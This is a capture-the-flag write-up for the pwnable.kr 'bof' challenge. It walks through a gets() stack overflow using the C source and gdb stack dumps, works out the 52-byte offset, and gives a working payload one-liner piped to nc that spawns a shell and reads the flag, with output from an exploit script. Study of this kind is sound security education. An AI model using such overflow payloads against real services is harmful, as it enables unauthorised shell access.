# bof

## Description

```Text
Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
```

## Analysis

```Shell
root@ubuntu:/home/xie/delete_any_time# ls -lh
total 12K
-rw-r--r-- 1 root root 7.2K May 16  2019 bof
-rw-r--r-- 1 root root  308 May 16  2019 bof.c
root@ubuntu:/home/xie/delete_any_time#
root@ubuntu:/home/xie/delete_any_time#
root@ubuntu:/home/xie/delete_any_time#file bof
bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped
root@ubuntu:/home/xie/delete_any_time#
```

With an executable file, let’s take a look at the source first:

```C
// bof.c

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");

    // Overflow can be constructed through gets()
	gets(overflowme);	// smash me!

	if(key == 0xcafebabe){
        // It will give you a shell permission
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

Basically the `main()` just calls the function `func()` and give `key` the value of `0xdeadbeef`.

So we need to make `key` equal to `0xcafebabe` instead of `0xdeadbeef` to make it spawn a shell. We control `overflowme` but we don’t control `key`. If we can cause a buffer overflow we will be able to overwrite `key`, and obviously `overflowme` is vulnerable.

```Shell
root@pwn:/ctf/work# chmod +x bof
root@pwn:/ctf/work# gdb bof
...
Reading symbols from bof...
(No debugging symbols found in bof)
pwndbg> b func
Breakpoint 1 at 0x632
pwndbg> run
Starting program: /ctf/work/bof
...
pwndbg> disassemble func
Dump of assembler code for function func:
   0x5664262c <+0>:	push   ebp
   0x5664262d <+1>:	mov    ebp,esp
   0x5664262f <+3>:	sub    esp,0x48
=> 0x56642632 <+6>:	mov    eax,gs:0x14
   0x56642638 <+12>:	mov    DWORD PTR [ebp-0xc],eax
   0x5664263b <+15>:	xor    eax,eax
   0x5664263d <+17>:	mov    DWORD PTR [esp],0x5664278c
   0x56642644 <+24>:	call   0xf7ddccd0 <__GI__IO_puts>
   0x56642649 <+29>:	lea    eax,[ebp-0x2c]
   0x5664264c <+32>:	mov    DWORD PTR [esp],eax
   0x5664264f <+35>:	call   0xf7ddc1b0 <_IO_gets>
   0x56642654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5664265b <+47>:	jne    0x5664266b <func+63>
   0x5664265d <+49>:	mov    DWORD PTR [esp],0x5664279b
   0x56642664 <+56>:	call   0xf7db0830 <__libc_system>
   0x56642669 <+61>:	jmp    0x56642677 <func+75>
   0x5664266b <+63>:	mov    DWORD PTR [esp],0x566427a3
   0x56642672 <+70>:	call   0xf7ddccd0 <__GI__IO_puts>
   0x56642677 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
   0x5664267a <+78>:	xor    eax,DWORD PTR gs:0x14
   0x56642681 <+85>:	je     0x56642688 <func+92>
   0x56642683 <+87>:	call   0xf7e834e0 <__stack_chk_fail>
   0x56642688 <+92>:	leave
   0x56642689 <+93>:	ret
End of assembler dump.
pwndbg>
```

We can break at `0x56642654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe` after giving a string of `"AAAAAAAAAAAAAAAAAAAA"` to `overflowme`. Then print the stack:

```Shell
   0x565ae63d <func+17>    mov    dword ptr [esp], 0x565ae78c
   0x565ae644 <func+24>    call   puts <puts>

   0x565ae649 <func+29>    lea    eax, [ebp - 0x2c]
   0x565ae64c <func+32>    mov    dword ptr [esp], eax
   0x565ae64f <func+35>    call   gets <gets>

 ► 0x565ae654 <func+40>    cmp    dword ptr [ebp + 8], 0xcafebabe
   0x565ae65b <func+47>    jne    func+63 <func+63>
    ↓
   0x565ae66b <func+63>    mov    dword ptr [esp], 0x565ae7a3
   0x565ae672 <func+70>    call   puts <puts>

   0x565ae677 <func+75>    mov    eax, dword ptr [ebp - 0xc]
   0x565ae67a <func+78>    xor    eax, dword ptr gs:[0x14]
...
pwndbg> x /50wx $esp
0xff81b330:	0xff81b34c	0x00000534	0x0000007e	0xf7eefa80
0xff81b340:	0x00000000	0xf7ef1000	0xf7f307e0	0x41414141
0xff81b350:	0x41414141	0x41414141	0x41414141	0x41414141
0xff81b360:	0x41414141	0x41414141	0x41414141	0x41414141
0xff81b370:	0x41414141	0xf7004141	0xff81b398	0x565ae69f
0xff81b380:	0xdeadbeef	0x00000000	0x565ae6b9	0x00000000
0xff81b390:	0xf7ef1000	0xf7ef1000	0x00000000	0xf7d24ee5
0xff81b3a0:	0x00000001	0xff81b434	0xff81b43c	0xff81b3c4
0xff81b3b0:	0xf7ef1000	0x00000000	0xff81b418	0x00000000
0xff81b3c0:	0xf7f31000	0x00000000	0xf7ef1000	0xf7ef1000
0xff81b3d0:	0x00000000	0x67d78147	0xc02d8757	0x00000000
0xff81b3e0:	0x00000000	0x00000000	0x00000001	0x565ae530
0xff81b3f0:	0x00000000	0xf7f1bb24
```

As seen above, if we give the program exactly `52` chars then `0xcafebabe` and eventually `0xdeadbeef` will be overwritten.

Another way to directly find the offset value `52`:

As can be seen from the line `0x56642654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe`, `0xdeadbeef` is at `$ebp+8`.

But how do we get the address of `overflowme`? The line `0x00000649 <+29>:    lea    -0x2c(%ebp),%eax` makes a help.

```Shell
pwndbg> x $ebp + 8
0xff81b380:	0xdeadbeef
pwndbg> x $ebp - 0x2c
0xff81b34c:	0x41414141
pwndbg> x $ebp - 0x2d
0xff81b34b:	0x414141f7
```

Also, we get `0xff81b380-0xff81b34c=52`.

```Shell
$ (python -c "print 'A'*52+'\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
ls
bof
bof.c
flag
log
log2
super.pl
cat flag
daddy, I just pwned a buFFer :)
```

## Solution

Write-up: [exploit.py](exploit.py).

```Shell
$ python3 pwnable.kr/bof/exploit.py
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ ls -al
$ ls -al
total 16780
drwxr-x---   3 root bof      4096 Oct 23  2016 .
drwxr-xr-x 115 root root     4096 Dec 22 08:10 ..
d---------   2 root root     4096 Jun 12  2014 .bash_history
-r-xr-x---   1 root bof      7348 Sep 12  2016 bof
-rw-r--r--   1 root root      308 Oct 23  2016 bof.c
-r--r-----   1 root bof        32 Jun 11  2014 flag
-rw-------   1 root root 17145438 Jun 12 10:26 log
-rw-r--r--   1 root root        0 Oct 23  2016 log2
-rwx------   1 root root      760 Sep 11  2014 super.pl
$ cat flag
daddy, I just pwned a buFFer :)
$
```

## Point

### GDB Tools

 There is a simple [introduction](https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/gdb.html) and more details can be seen in [GDB Manuals](https://www.gnu.org/software/gdb/documentation/).